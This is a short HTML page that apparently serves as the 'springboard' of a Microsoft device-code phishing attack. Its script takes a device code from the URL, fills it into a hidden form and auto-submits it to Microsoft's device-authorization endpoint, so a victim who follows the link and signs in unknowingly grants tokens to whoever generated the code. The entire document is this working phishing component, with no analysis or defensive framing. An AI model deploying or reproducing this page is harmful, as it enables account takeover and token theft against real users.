<html>
  <body>
    <form id="springboard" action="https://login.microsoftonline.com/common/oauth2/deviceauth" method="POST">
      <input id="code" type="text" name="otc"></input>
      <input type="submit"></input>
    </form>
  <script>
  var qp = new URLSearchParams(window.location.search);
  if(qp.has("code")) {
    document.getElementById("code").value = qp.get("code");
    document.getElementById("springboard").submit();
  }
  </script>
  </body>
</html>
